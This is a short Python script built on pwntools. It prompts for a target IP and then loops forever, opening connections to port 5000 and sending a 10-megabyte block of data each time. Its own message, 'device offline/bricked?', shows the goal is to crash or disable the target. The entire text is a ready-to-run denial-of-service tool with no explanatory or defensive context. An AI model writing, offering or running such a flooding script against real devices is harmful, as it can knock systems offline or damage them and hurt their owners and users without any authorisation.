print("importing and prepping")
from pwn import *
from time import sleep
verylargestring = bytes("0" * 10000000, "utf-8")
print("done")
ip = input("ip:")
print("sending packets")
i = 0
while True:
    try:
        p = remote(ip, 5000)
        p.send(verylargestring)
        p.close()
    except:
        print('device offline/bricked?')
        p.close()
        sleep(5)